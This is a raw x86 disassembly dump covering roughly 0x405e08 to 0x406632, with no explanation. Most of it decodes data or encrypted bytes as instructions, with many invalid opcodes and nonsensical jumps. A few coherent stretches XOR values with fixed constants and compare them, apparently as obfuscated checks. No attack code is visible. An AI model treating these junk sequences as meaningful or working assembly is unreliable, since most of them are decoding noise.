  405e08:	lods   eax,DWORD PTR ds:[esi]
  405e09:	or     eax,DWORD PTR [ebp+eiz*8-0x2fcd82a9]
  405e10:	pop    ds
  405e11:	push   eax
  405e12:	xchg   esp,eax
  405e13:	mov    esp,eax
  405e15:	mov    ds:0x853d030,eax
  405e1a:	cmp    BYTE PTR [edx+edi*2],dl
  405e1d:	sbb    esi,DWORD PTR [ebx-0x17]
  405e20:	add    dh,BYTE PTR [esi]
  405e22:	lahf   
  405e23:	bound  ebp,QWORD PTR [ebx+ebx*2-0x4c]
  405e27:	fdiv   DWORD PTR [ecx+edi*8+0x24]
  405e2b:	jae    0x405e3d
  405e2d:	arpl   WORD PTR [edx+0x4a8d9d77],cx
  405e33:	cwde   
  405e34:	sub    ebx,esi
  405e36:	jno    0x405df9
  405e38:	push   edi
  405e39:	(bad)  
  405e3a:	mov    eax,ecx
  405e3c:	es scas eax,DWORD PTR es:[edi]
  405e3e:	(bad)  
  405e3f:	mov    ebx,0xbaef7f5c
  405e44:	cmc    
  405e45:	rcr    DWORD PTR [ebx+0x2be257e1],1
  405e4b:	js     0x405dee
  405e4d:	or     esi,DWORD PTR [ebx]
  405e4f:	int    0x5b
  405e51:	call   0xa494232d
  405e56:	jb     0x405e47
  405e58:	and    BYTE PTR [ebx+0x17],bl
  405e5b:	jle    0x405e65
  405e5d:	jne    0x405e34
  405e5f:	pop    ebx
  405e60:	mov    ecx,DWORD PTR [esi+0x4]
  405e63:	mov    ecx,eax
  405e65:	shl    ecx,0x1e
  405e68:	xor    ecx,0x80000000
  405e6e:	mov    DWORD PTR [ebp-0x64],ecx
  405e71:	mov    ecx,DWORD PTR [esi]
  405e73:	mov    edx,DWORD PTR [esi+0x4]
  405e76:	jmp    0x406217
  405e7b:	pusha  
  405e7c:	adc    bh,BYTE PTR ds:0x60b2b35d
  405e82:	adc    al,0xa6
  405e84:	pop    es
  405e85:	ds (bad) 
  405e88:	test   edi,edx
  405e8a:	jecxz  0x405e4a
  405e8c:	sub    eax,0xc4bdbebe
  405e91:	mov    esi,0x23dc5ebe
  405e96:	xchg   esp,eax
  405e97:	sub    edx,ebp
  405e99:	push   ebp
  405e9a:	mov    edx,0x4d05ccb6
  405e9f:	xchg   ebx,eax
  405ea0:	adc    al,0x51
  405ea2:	mov    DWORD PTR [ebx+0x476dfca],ecx
  405ea8:	xor    dl,dl
  405eaa:	mov    BYTE PTR [ecx-0x6d6f654a],dh
  405eb0:	xor    DWORD PTR [ebp-0x3030eec5],0x75
  405eb7:	in     al,0x94
  405eb9:	outs   dx,BYTE PTR ds:[esi]
  405eba:	bound  esi,QWORD PTR [esi-0x53]
  405ebd:	sahf   
  405ebe:	int    0x73
  405ec0:	mov    ch,0x35
  405ec2:	(bad)  
  405ec3:	fcomp  DWORD PTR [edi]
  405ec5:	(bad)  
  405ec6:	lea    eax,[bp+0x3161]
  405ecb:	or     al,0xa8
  405ecd:	and    ah,BYTE PTR [eax+eax*8+0xce0272e]
  405ed4:	mov    dh,0xa
  405ed6:	xchg   ebp,eax
  405ed7:	xchg   ecx,eax
  405ed8:	xchg   esp,eax
  405ed9:	xor    BYTE PTR cs:[esp+eiz*2+0x5f3292d0],dl
  405ee1:	in     eax,0xac
  405ee3:	mov    dh,0xc
  405ee5:	mov    eax,0xd578efff
  405eea:	jno    0x405f0f
  405eec:	inc    ebx
  405eed:	pop    ss
  405eee:	js     0x405eb2
  405ef0:	xchg   ebp,eax
  405ef1:	lea    ecx,ds:0x15927608
  405ef7:	cli    
  405ef8:	mov    BYTE PTR [ebx+0x51681fd9],0x57
  405eff:	mov    edi,0x5fd934c5
  405f04:	jne    0x405eaa
  405f06:	jmp    0x92be:0xc9cfaea2
  405f0d:	jge    0x405ee0
  405f0f:	das    
  405f10:	push   esp
  405f11:	dec    esi
  405f12:	arpl   WORD PTR [ecx],dx
  405f14:	mov    cl,0xde
  405f16:	mov    esi,0x2477b268
  405f1b:	push   0x656865f4
  405f20:	push   esi
  405f21:	in     al,dx
  405f22:	mov    ebx,0xa68d6b59
  405f27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f28:	xor    DWORD PTR [edx+0x711d2c40],ecx
  405f2e:	pop    edi
  405f2f:	jo     0x405edb
  405f31:	xchg   DWORD PTR [edi-0x5b82c63e],ecx
  405f37:	sub    eax,DWORD PTR [edi+0x27]
  405f3a:	ficom  DWORD PTR [eax]
  405f3c:	outs   dx,BYTE PTR ds:[esi]
  405f3d:	daa    
  405f3e:	iret   
  405f3f:	sbb    DWORD PTR [ebp+ecx*4-0x7bfafdcf],edi
  405f46:	xor    bl,BYTE PTR [eax+eax*2]
  405f49:	ret    0x4ef6
  405f4c:	pop    ebp
  405f4d:	test   edx,esp
  405f4f:	jae    0x405fab
  405f51:	iret   
  405f52:	sbb    eax,0xb1f7e71a
  405f57:	cmp    DWORD PTR [esi-0x75],0x4f
  405f5b:	jns    0x405fdc
  405f5d:	mov    ebx,0xef027c4
  405f62:	fnsave [esi-0x5b]
  405f65:	shr    DWORD PTR [eax-0x3d],0x82
  405f69:	jmp    0x41a3b54a
  405f6e:	cdq    
  405f6f:	adc    BYTE PTR [ebx-0xf28297a],ah
  405f75:	jae    0x405f67
  405f77:	jo     0x405ff1
  405f79:	and    eax,0x33a10c19
  405f7e:	fdivr  QWORD PTR [esi+0x6ae8da0c]
  405f84:	repz clc 
  405f86:	call   0x71e7:0xf77f9eca
  405f8d:	xchg   ebx,eax
  405f8e:	std    
  405f8f:	repz sub ecx,DWORD PTR [ebp+esi*4-0x21]
  405f94:	or     esp,esp
  405f96:	adc    ebp,DWORD PTR [ebp-0x35]
  405f99:	(bad)  
  405f9a:	xor    al,BYTE PTR [eax+ebp*8-0x36]
  405f9e:	add    dh,bh
  405fa0:	inc    ebx
  405fa1:	enter  0x15b2,0x6a
  405fa5:	push   ds
  405fa6:	mov    eax,ebp
  405fa8:	sub    eax,0x56ab5d42
  405fad:	xchg   ecx,edx
  405faf:	fldenv [ebx+0xadb8dd4]
  405fb5:	clc    
  405fb6:	int3   
  405fb7:	add    al,0x6c
  405fb9:	sar    DWORD PTR [ebp-0x71389e34],cl
  405fbf:	add    cl,0xcb
  405fc2:	add    BYTE PTR [eax+0x12],ah
  405fc5:	test   BYTE PTR [ecx],ch
  405fc7:	dec    eax
  405fc8:	mov    ebx,0xfae743f2
  405fcd:	out    dx,al
  405fce:	test   DWORD PTR [edi+edx*8],ebp
  405fd1:	(bad)  
  405fd2:	jb     0x405fd4
  405fd4:	nop
  405fd5:	test   BYTE PTR [eax],ah
  405fd7:	jecxz  0x406008
  405fd9:	add    BYTE PTR [edx+0x65fb71e3],ch
  405fdf:	push   edi
  405fe0:	dec    esi
  405fe1:	ret    
  405fe2:	dec    esp
  405fe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fe4:	sbb    al,BYTE PTR [edi]
  405fe6:	sbb    bl,ch
  405fe8:	shl    BYTE PTR [ebp+0x2bdc33cc],0x4d
  405fef:	in     eax,0x1a
  405ff1:	je     0x40606c
  405ff3:	push   0x95e91103
  405ff8:	mov    ebp,0xd611515
  405ffd:	adc    bl,BYTE PTR [edi-0xd]
  406000:	scas   eax,DWORD PTR es:[edi]
  406001:	imul   eax,DWORD PTR [esi-0x1f],0xa74634e9
  406008:	imul   eax,DWORD PTR [esi-0x3b],0xffffffd4
  40600c:	retf   
  40600d:	jmp    0x2e9c:0x829e174c
  406014:	fst    DWORD PTR [eax-0x43ab3219]
  40601a:	dec    edi
  40601b:	out    0x39,al
  40601d:	cmp    al,0x88
  40601f:	in     eax,dx
  406020:	in     al,dx
  406021:	bnd jmp 0xc674756d
  406027:	dec    edi
  406028:	mov    ecx,0xca42807e
  40602d:	sub    eax,0xe914808d
  406032:	xchg   DWORD PTR [esi+ebp*1+0x13],edx
  406036:	mov    al,0x35
  406038:	stos   DWORD PTR es:[edi],eax
  406039:	in     eax,dx
  40603a:	pushf  
  40603b:	pop    esi
  40603c:	add    ebp,edx
  40603e:	sbb    DWORD PTR [ebx-0x7e2e7c98],ebx
  406044:	loopne 0x4060a2
  406046:	call   0x73ff:0xdc3d03cf
  40604d:	aam    0xa0
  40604f:	cld    
  406050:	dec    ecx
  406051:	sbb    eax,DWORD PTR [ebp+0x53660f94]
  406057:	pop    es
  406058:	(bad)  [esi]
  40605a:	shr    BYTE PTR [ecx+0x7e04f6],cl
  406060:	dec    esp
  406061:	dec    dl
  406063:	dec    esp
  406064:	shl    DWORD PTR [ecx-0x71d00948],1
  40606a:	xchg   edi,eax
  40606b:	jbe    0x405ff6
  40606d:	in     eax,0x1e
  40606f:	scas   eax,DWORD PTR es:[edi]
  406070:	push   0xa6889e6d
  406075:	adc    ah,BYTE PTR [ecx-0x72]
  406078:	pushf  
  406079:	and    cl,dl
  40607b:	xchg   edx,eax
  40607c:	ror    BYTE PTR [ebp-0x502af427],cl
  406082:	daa    
  406083:	and    BYTE PTR [edx-0x3d],dh
  406086:	stos   DWORD PTR es:[edi],eax
  406087:	cs and eax,0x59314b19
  40608d:	cmp    dl,al
  40608f:	add    eax,0xdcbbfc2e
  406094:	test   esp,0x343abfda
  40609a:	iretw  
  40609c:	dec    ecx
  40609d:	push   0x1c
  40609f:	jp     0x4060f0
  4060a1:	dec    eax
  4060a2:	sbb    esi,0xdad1f0a0
  4060a8:	dec    eax
  4060a9:	(bad)  
  4060aa:	in     al,dx
  4060ab:	mov    eax,0x26f43b99
  4060b0:	dec    ebx
  4060b1:	jne    0x406119
  4060b3:	retf   0xe3ec
  4060b6:	in     eax,dx
  4060b7:	enter  0x98d3,0xd5
  4060bb:	jmp    0x4060dc
  4060bd:	cmp    DWORD PTR [edx-0x33e3e88f],esi
  4060c3:	test   DWORD PTR [edi-0x77],eax
  4060c6:	test   DWORD PTR [ebx],ebp
  4060c8:	fsubr  QWORD PTR [esi]
  4060ca:	pop    ebx
  4060cb:	push   ss
  4060cc:	dec    esp
  4060cd:	inc    edx
  4060ce:	push   0x1ca5fb81
  4060d3:	stc    
  4060d4:	adc    bl,0xd6
  4060d7:	imul   esi,DWORD PTR [edi],0x866ba732
  4060dd:	ins    DWORD PTR es:[edi],dx
  4060de:	jb     0x406094
  4060e0:	sbb    edi,esi
  4060e2:	push   ecx
  4060e3:	ins    DWORD PTR es:[edi],dx
  4060e4:	(bad)
  4060e7:	enter  0x8a21,0x75
  4060eb:	sub    al,0xfd
  4060ed:	sub    eax,0xb5e4b64e
  4060f2:	mov    ch,0x29
  4060f4:	icebp  
  4060f5:	pop    esp
  4060f6:	xchg   esi,eax
  4060f7:	jmp    0xc1c56fe7
  4060fc:	jmp    0xe8277402
  406101:	dec    ecx
  406102:	or     al,0x33
  406104:	je     0x406144
  406106:	and    eax,DWORD PTR [edi-0x2c]
  406109:	fsub   DWORD PTR [edi]
  40610b:	dec    ebx
  40610d:	xor    eax,0xd83bedaf
  406112:	cwde   
  406113:	fld    DWORD PTR [edi+0x61ced742]
  406119:	pop    edi
  40611a:	sbb    ebx,DWORD PTR [ecx+0x75]
  40611d:	adc    BYTE PTR [eax-0xc3256ee],bl
  406123:	add    DWORD PTR [edx],0x18
  406126:	dec    esp
  406127:	scas   eax,DWORD PTR es:[edi]
  406128:	ja     0x40613d
  40612a:	sub    dl,BYTE PTR [ebx-0x6151f4ab]
  406130:	std    
  406131:	and    BYTE PTR [esi-0x22],0x36
  406135:	cmp    al,0xa
  406137:	fs in  eax,0x7c
  40613a:	dec    ebx
  40613b:	loopne 0x406125
  40613d:	push   0x712ee29d
  406142:	mov    al,0x1e
  406144:	ins    BYTE PTR es:[edi],dx
  406145:	je     0x4060f9
  406147:	inc    esp
  406148:	cmp    al,0x27
  40614a:	and    DWORD PTR [bp+di],eax
  40614d:	push   ebp
  40614e:	cmp    al,0x60
  406150:	fmul   QWORD PTR [ecx-0xdeeb929]
  406156:	rcl    ecx,cl
  406158:	push   ds
  406159:	mov    ds:0x31fdf112,eax
  40615e:	ret    
  40615f:	test   BYTE PTR [ebp-0x71de3181],cl
  406165:	jmp    0x83668f6
  40616a:	add    eax,0xebea1ca3
  40616f:	bound  ebx,QWORD PTR [ebx-0x31a9c867]
  406175:	repnz sub esi,eax
  406178:	pop    es
  406179:	jae    0x406114
  40617b:	push   ss
  40617c:	stc    
  40617d:	scas   eax,DWORD PTR es:[edi]
  40617e:	sar    BYTE PTR [edx-0x69],1
  406181:	addr16 stc 
  406183:	aad    0x3a
  406185:	loope  0x406118
  406187:	mov    bl,0xc3
  406189:	or     dh,dl
  40618b:	ss ins BYTE PTR es:[edi],dx
  40618d:	mov    ebp,0x55a24c4c
  406192:	call   0xd6b7:0x7b0d85f5
  406199:	dec    esi
  40619a:	or     bh,BYTE PTR [edx+0x79]
  40619d:	sub    al,0x67
  40619f:	pop    es
  4061a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061a1:	jno    0x4061a8
  4061a3:	push   es
  4061a4:	stc    
  4061a5:	cmc    
  4061a6:	mov    bh,0x89
  4061a8:	arpl   WORD PTR [edi+0x53],si
  4061ab:	stc    
  4061ac:	ror    DWORD PTR [edx],1
  4061ae:	push   cs
  4061af:	jp     0x4061f5
  4061b1:	pop    esp
  4061b2:	jnp    0x406178
  4061b4:	add    eax,0x9f1f8420
  4061b9:	aad    0x9d
  4061bb:	mov    al,ds:0xe2ae106c
  4061c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061c1:	jp     0x406194
  4061c3:	std    
  4061c4:	sub    BYTE PTR [ebp-0x1f],ch
  4061c7:	lods   eax,DWORD PTR ds:[esi]
  4061c8:	and    BYTE PTR [ebx+eax*1+0x6b7284bd],dh
  4061cf:	addr16 xchg esi,eax
  4061d1:	out    dx,eax
  4061d2:	retf   
  4061d3:	pop    es
  4061d4:	ret    
  4061d5:	sub    al,0x8f
  4061d7:	out    dx,al
  4061d8:	pop    edi
  4061d9:	adc    dh,BYTE PTR [eax+0x3e]
  4061dc:	and    al,0x12
  4061de:	in     al,dx
  4061df:	dec    ecx
  4061e0:	jno    0x4061d2
  4061e2:	imul   eax,DWORD PTR [edi],0x6f
  4061e5:	ins    BYTE PTR es:[edi],dx
  4061e6:	gs es retf 0x305b
  4061eb:	imul   DWORD PTR [ecx+ebp*8+0x45]
  4061ef:	fistp  WORD PTR [eax+eax*1+0x4b]
  4061f3:	jle    0x406267
  4061f5:	or     eax,0x3a973514
  4061fa:	mov    eax,0xdbe9886f
  4061ff:	sub    ecx,edx
  406201:	gs pop edx
  406203:	dec    edx
  406204:	fdivr  QWORD PTR [edi+ebp*4-0xf]
  406208:	jnp    0x406201
  40620a:	shr    BYTE PTR [edx+0x483dfc2b],1
  406210:	pop    esi
  406211:	lods   al,BYTE PTR ds:[esi]
  406212:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406213:	rcl    DWORD PTR [ebx-0xd7ea380],1
  406219:	call   0x81dc8da8
  40621e:	icebp  
  40621f:	ja     0x4061d6
  406221:	jns    0x4061ee
  406223:	shrd   ecx,edx,0x2
  406227:	shr    edx,0x2
  40622a:	or     edx,DWORD PTR [ebp-0x64]
  40622d:	xor    eax,eax
  40622f:	or     ecx,eax
  406231:	mov    eax,DWORD PTR [ebx]
  406233:	mov    DWORD PTR [ebp-0x2c],edx
  406236:	mov    edx,DWORD PTR [ebx+0x4]
  406239:	mov    edx,eax
  40623b:	xor    eax,eax
  40623d:	shl    edx,0x1e
  406240:	xor    edx,0x80000000
  406246:	mov    DWORD PTR [ebp-0x70],eax
  406249:	mov    eax,DWORD PTR [ebx]
  40624b:	mov    DWORD PTR [ebp-0x6c],edx
  40624e:	mov    edx,DWORD PTR [ebx+0x4]
  406251:	xor    eax,0xcb79b577
  406256:	xor    edx,0x9c2b8ae8
  40625c:	shrd   eax,edx,0x2
  406260:	or     eax,DWORD PTR [ebp-0x70]
  406263:	shr    edx,0x2
  406266:	mov    DWORD PTR [ebp-0x38],eax
  406269:	mov    eax,edx
  40626b:	or     eax,DWORD PTR [ebp-0x6c]
  40626e:	mov    DWORD PTR [ebp-0x5c],edx
  406271:	cmp    ecx,DWORD PTR [ebp-0x38]
  406274:	jne    0x405a82
  40627a:	cmp    DWORD PTR [ebp-0x2c],eax
  40627d:	je     0x408bb3
  406283:	jmp    0x405a82
  406288:	mov    eax,DWORD PTR [esi]
  40628a:	mov    ecx,DWORD PTR [esi+0x4]
  40628d:	mov    ecx,eax
  40628f:	shl    ecx,0x1e
  406292:	xor    ecx,0x80000000
  406298:	mov    DWORD PTR [ebp+0x14],ecx
  40629b:	mov    ecx,DWORD PTR [esi]
  40629d:	mov    edx,DWORD PTR [esi+0x4]
  4062a0:	xor    ecx,0xcb79b577
  4062a6:	xor    edx,0x9c2b8ae8
  4062ac:	shrd   ecx,edx,0x2
  4062b0:	xor    eax,eax
  4062b2:	or     ecx,eax
  4062b4:	mov    eax,DWORD PTR [ebx]
  4062b6:	mov    DWORD PTR [ebp-0x68],ecx
  4062b9:	mov    ecx,DWORD PTR [ebx+0x4]
  4062bc:	mov    ecx,eax
  4062be:	xor    eax,eax
  4062c0:	shr    edx,0x2
  4062c3:	or     edx,DWORD PTR [ebp+0x14]
  4062c6:	mov    DWORD PTR [ebp+0x10],eax
  4062c9:	mov    eax,DWORD PTR [ebx]
  4062cb:	shl    ecx,0x1e
  4062ce:	xor    ecx,0x80000000
  4062d4:	mov    DWORD PTR [ebp-0x64],edx
  4062d7:	jmp    0x406678
  4062dc:	aas    
  4062dd:	jne    0x40629e
  4062df:	arpl   ax,di
  4062e1:	jl     0x406347
  4062e3:	jns    0x40632d
  4062e5:	das    
  4062e6:	inc    esi
  4062e7:	xchg   edx,eax
  4062e8:	ret    0x7e60
  4062eb:	iret   
  4062ec:	mov    ebp,0xbdbebe33
  4062f1:	les    edi,FWORD PTR [esi-0x388bf942]
  4062f7:	sar    DWORD PTR [ecx+0x4e],0x76
  4062fb:	mov    cl,0x14
  4062fd:	popa   
  4062fe:	xor    eax,0xd27cc7aa
  406303:	(bad)  
  406304:	lock mov esp,0x3fead95a
  40630a:	add    DWORD PTR [esi+0x60],esp
  40630d:	dec    ebp
  40630e:	fwait
  40630f:	mov    dl,0x0
  406311:	jl     0x406302
  406313:	fdiv   DWORD PTR [ecx-0x7347b685]
  406319:	(bad)  
  40631b:	xor    DWORD PTR [edi],0x3b3d8a44
  406321:	fstp   DWORD PTR [edx]
  406323:	addr16 out dx,al
  406325:	mov    bh,0x17
  406327:	add    DWORD PTR [eax-0x28],0xefee2679
  40632e:	push   edi
  40632f:	jl     0x406373
  406331:	into   
  406332:	push   eax
  406333:	inc    ebp
  406334:	(bad)  
  406335:	loop   0x406388
  406337:	xchg   ebp,eax
  406338:	jge    0x40638d
  40633a:	repnz mov al,0xa4
  40633d:	mov    edi,0xef6e8c3f
  406342:	gs sub eax,edi
  406345:	lock mov al,ds:0x9a660d8b
  40634b:	push   0x25d1018f
  406350:	dec    edx
  406351:	cs mov bh,0xe1
  406354:	dec    ebx
  406355:	sub    ebp,DWORD PTR [esi]
  406357:	sbb    eax,0x86fa59ec
  40635c:	adc    eax,0xf8b36548
  406361:	xor    eax,0x1b3c70b8
  406366:	std    
  406367:	xchg   edi,eax
  406368:	test   eax,0xf8d52e8b
  40636d:	jno    0x406322
  40636f:	leave  
  406370:	ficomp WORD PTR [ebp+0x1]
  406373:	xchg   DWORD PTR [eax],edx
  406375:	int3   
  406376:	nop
  406377:	outs   dx,BYTE PTR ds:[esi]
  406378:	arpl   WORD PTR [edx+0x5ba9e31c],si
  40637e:	loopne 0x406349
  406380:	mov    dh,0x27
  406382:	(bad)  
  406383:	(bad)  [eax+edi*1-0x31d0194]
  40638a:	pop    ebp
  40638b:	pusha  
  40638c:	clc    
  40638d:	dec    eax
  40638e:	or     BYTE PTR [ebx+0x1ec89089],dl
  406394:	pop    ebp
  406395:	shl    DWORD PTR [ecx+0x4],cl
  406398:	ja     0x406403
  40639a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40639b:	(bad)  
  40639c:	mov    edx,0x89c0cad2
  4063a1:	dec    esp
  4063a2:	sub    al,0xe6
  4063a4:	arpl   WORD PTR [ebx-0x13],si
  4063a7:	not    BYTE PTR [esi]
  4063a9:	shl    BYTE PTR [eax-0x5f],cl
  4063ac:	(bad)
  4063b0:	into   
  4063b1:	sti    
  4063b2:	fldcw  WORD PTR [ebx+ebx*8+0xb]
  4063b6:	ins    DWORD PTR es:[edi],dx
  4063b7:	out    dx,eax
  4063b8:	jg     0x406342
  4063ba:	dec    esp
  4063bb:	dec    eax
  4063bc:	push   0xffffffe5
  4063be:	mov    ecx,0xc14609ec
  4063c3:	ja     0x406430
  4063c5:	mov    bl,0x24
  4063c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063c8:	mov    edx,DWORD PTR [ebx-0x67bc6098]
  4063ce:	jns    0x406421
  4063d0:	jmp    0xf94dcf05
  4063d5:	push   eax
  4063d6:	shl    edi,cl
  4063d8:	mov    ds,edi
  4063da:	in     al,0x3f
  4063dc:	rcr    BYTE PTR [esi],1
  4063de:	inc    esi
  4063df:	xchg   esp,eax
  4063e0:	fistp  QWORD PTR [edi]
  4063e2:	std    
  4063e3:	(bad)  
  4063e4:	xor    BYTE PTR [ecx+ebx*4-0x104f57d1],bl
  4063eb:	(bad)  
  4063ec:	out    dx,al
  4063ed:	leave  
  4063ee:	adc    esi,DWORD PTR [esi]
  4063f0:	adc    DWORD PTR [esi],edi
  4063f2:	mov    edx,0x25ec2ee1
  4063f7:	sar    BYTE PTR [ecx-0x1b8343ec],1
  4063fd:	or     DWORD PTR [ebx-0x4f],ebx
  406400:	sti    
  406401:	sbb    eax,0x9a6dbff4
  406406:	adc    BYTE PTR [edx+0x3bc29064],al
  40640c:	out    0x66,eax
  40640e:	mov    edx,0x263e97e6
  406413:	cdq    
  406414:	aam    0x3b
  406416:	js     0x4063c7
  406418:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406419:	mov    bl,0x9e
  40641b:	sbb    al,0x6
  40641d:	call   esp
  40641f:	popf   
  406420:	xchg   ebp,eax
  406421:	add    al,0xd8
  406423:	mov    bl,0xb1
  406425:	mov    cl,0x23
  406427:	mov    edi,0x4f2c82c9
  40642c:	outs   dx,BYTE PTR ds:[esi]
  40642d:	or     eax,0xe240f482
  406432:	ja     0x406459
  406434:	dec    esp
  406435:	dec    ebp
  406436:	pop    ecx
  406437:	popa   
  406438:	xor    DWORD PTR [edx+0x2435a3ac],esi
  40643e:	xor    eax,0x8f67f130
  406443:	call   0x8dfd:0x39948c4a
  40644a:	xchg   BYTE PTR [esi+0x32],dh
  40644d:	pop    edi
  40644e:	dec    eax
  40644f:	mov    al,0x5a
  406451:	pushf  
  406452:	aas    
  406453:	pusha  
  406454:	xor    ecx,ecx
  406456:	and    ch,BYTE PTR [edi]
  406458:	inc    ebx
  406459:	je     0x4064b4
  40645b:	test   eax,0x75314847
  406460:	out    0x6b,al
  406462:	shr    edi,1
  406464:	and    DWORD PTR [ecx],esi
  406466:	cmp    ch,cl
  406468:	loop   0x406459
  40646a:	add    edx,DWORD PTR [ebx]
  40646c:	push   ebp
  40646d:	imul   esp,DWORD PTR [ecx+0x28],0xa08ca41a
  406474:	pop    edi
  406475:	push   edi
  406476:	cmc    
  406477:	and    dh,bh
  406479:	pop    esi
  40647a:	outs   dx,BYTE PTR ds:[esi]
  40647b:	push   esp
  40647c:	mov    dh,0xa7
  40647e:	pop    ebp
  40647f:	dec    eax
  406480:	cwde   
  406481:	mov    ?,WORD PTR [esi+0x172f9750]
  406487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406488:	das    
  406489:	mov    esp,0x4a0cd95b
  40648e:	jno    0x4064d2
  406490:	pop    ebp
  406491:	mov    edi,0x9cb773eb
  406496:	and    al,0xc0
  406498:	pop    ebx
  406499:	leave  
  40649a:	cmp    BYTE PTR [eax-0x5f351d97],0x23
  4064a1:	arpl   WORD PTR [edx-0x6eb11295],cx
  4064a7:	cmp    DWORD PTR [esi+edx*4+0x4c],ebp
  4064ab:	adc    bh,BYTE PTR [esi+0x6f]
  4064ae:	lods   eax,DWORD PTR ds:[esi]
  4064af:	in     eax,dx
  4064b0:	dec    edi
  4064b1:	push   ebp
  4064b2:	inc    esp
  4064b3:	and    al,0xbe
  4064b5:	mov    esp,0x3cd55832
  4064ba:	out    0x53,al
  4064bc:	das    
  4064bd:	sbb    edi,DWORD PTR [edi]
  4064bf:	sbb    eax,0xb8a17420
  4064c4:	pusha  
  4064c5:	mov    esp,ebx
  4064c7:	call   DWORD PTR [ebx+0x10]
  4064ca:	add    al,0xad
  4064cc:	lods   eax,DWORD PTR ds:[esi]
  4064cd:	fwait
  4064ce:	mov    es,eax
  4064d0:	outs   dx,BYTE PTR ds:[esi]
  4064d1:	nop
  4064d2:	arpl   WORD PTR [ecx+0x6437297],bx
  4064d8:	and    eax,0x80bf85d3
  4064dd:	cmp    eax,0x1668c33d
  4064e2:	pusha  
  4064e3:	test   bh,dh
  4064e5:	sub    edi,eax
  4064e7:	(bad)  
  4064e8:	dec    ecx
  4064e9:	pop    eax
  4064ea:	lea    esi,[edx+0x63ce0746]
  4064f0:	stos   DWORD PTR es:[edi],eax
  4064f1:	jmp    0x91b:0x96852e8
  4064f8:	leave  
  4064f9:	stos   BYTE PTR es:[edi],al
  4064fa:	jle    0x406544
  4064fc:	aad    0x25
  4064fe:	and    DWORD PTR [ecx-0x6b2f584e],edi
  406504:	jae    0x4064bb
  406506:	mov    bh,dl
  406508:	(bad)  
  40650a:	adc    esp,DWORD PTR [ebp+0x6c]
  40650d:	pop    ebx
  40650e:	mov    DWORD PTR [edi-0x6133de8e],eax
  406514:	mov    esi,0xf7bc5be0
  406519:	add    al,0x1f
  40651c:	gs pop ss
  40651e:	lds    edx,FWORD PTR [esi]
  406520:	fcomp  DWORD PTR [ebx]
  406522:	adc    eax,0x841bd93e
  406527:	ds push esi
  406529:	out    0x62,al
  40652b:	mov    edi,0xe495a0ef
  406530:	imul   BYTE PTR [edx+0x3d]
  406533:	mov    esp,0x1e791e6d
  406538:	es (bad) 
  40653a:	aaa    
  40653b:	dec    esi
  40653c:	mov    bh,0x66
  40653e:	in     al,0xa
  406540:	dec    esp
  406541:	push   0x37
  406543:	shl    DWORD PTR [esi+0x2b7fdc62],1
  406549:	cmp    dh,BYTE PTR [edx-0x44d973a9]
  40654f:	add    cl,BYTE PTR [edx]
  406551:	add    eax,0xce22c1c7
  406556:	int3   
  406557:	(bad)  
  406558:	cwde   
  406559:	jmp    0x4065bc
  40655b:	ffree  st(7)
  40655d:	mov    eax,ds:0xe09fed9d
  406562:	jb     0x4064fc
  406564:	xchg   edi,eax
  406565:	mov    BYTE PTR [ebx-0x4],al
  406568:	mov    ecx,ebx
  40656a:	and    eax,0x6653af14
  40656f:	inc    eax
  406570:	jbe    0x406590
  406572:	mov    ds:0x182904f6,eax
  406577:	arpl   WORD PTR [edi-0x72],di
  40657a:	dec    ecx
  40657b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40657c:	lds    esi,FWORD PTR [eiz*4+0x5e26f7dc]
  406583:	xor    edx,DWORD PTR [eax-0x4b23aded]
  406589:	dec    edx
  40658a:	adc    DWORD PTR [eax+0x3644f4d7],ebp
  406590:	jmp    0x40656c
  406592:	aas    
  406593:	cmp    al,0xa0
  406595:	push   cs
  406596:	test   al,0x5a
  406598:	mov    ds,WORD PTR [edi]
  40659a:	dec    ebp
  40659b:	dec    edi
  40659c:	popa   
  40659d:	test   BYTE PTR [ecx],ch
  40659f:	adc    eax,0xca113788
  4065a4:	xchg   ebp,eax
  4065a5:	xchg   esp,eax
  4065a6:	fdivr  QWORD PTR [eax+0x44d2e13c]
  4065ac:	into   
  4065ad:	fcomp  st(6)
  4065af:	rcl    dh,0xd6
  4065b2:	and    bh,dl
  4065b4:	stos   DWORD PTR es:[edi],eax
  4065b5:	pop    edx
  4065b6:	xor    eax,0x87de9e6
  4065bb:	sbb    ebp,DWORD PTR cs:[esi-0x3b4f65a5]
  4065c2:	mov    dh,0xe
  4065c4:	out    dx,eax
  4065c5:	(bad)  
  4065c7:	rol    dh,cl
  4065c9:	sbb    al,bh
  4065cb:	mov    al,dh
  4065cd:	repnz adc eax,0x73206e7d
  4065d3:	ret    0xd2e5
  4065d6:	and    al,0xb0
  4065d8:	rcr    cl,1
  4065da:	inc    esi
  4065db:	mov    bh,0x1e
  4065dd:	mov    dl,0x53
  4065df:	icebp  
  4065e0:	gs mov cl,0xee
  4065e3:	out    0x87,eax
  4065e5:	and    eax,0xc47db09
  4065ea:	dec    edi
  4065eb:	add    eax,0x6573014e
  4065f0:	mov    cl,0x26
  4065f2:	(bad)  [esi-0x1b]
  4065f5:	call   0x675:0xf234b20
  4065fc:	push   ecx
  4065fd:	and    eax,0x5ced51e1
  406602:	mov    bh,0x42
  406604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406605:	les    edi,FWORD PTR [edi*4-0x61107189]
  40660c:	sbb    dl,0xc1
  40660f:	cdq    
  406610:	pop    esp
  406611:	mov    al,0x5f
  406613:	icebp  
  406614:	mov    edi,cs
  406616:	xchg   esi,eax
  406617:	push   edx
  406618:	sbb    edi,0x7f
  40661b:	gs dec ecx
  40661d:	jp     0x406634
  40661f:	mov    al,ds:0xe3075584
  406624:	gs push cs
  406626:	jmp    0x4065d7
  406628:	lods   eax,DWORD PTR ds:[esi]
  406629:	mov    edi,0x181839b
  40662e:	push   ebp
  40662f:	out    dx,eax
  406630:	xchg   ebx,eax
  406631:	xchg   edi,eax
  406632:	mov    cl,0xf3
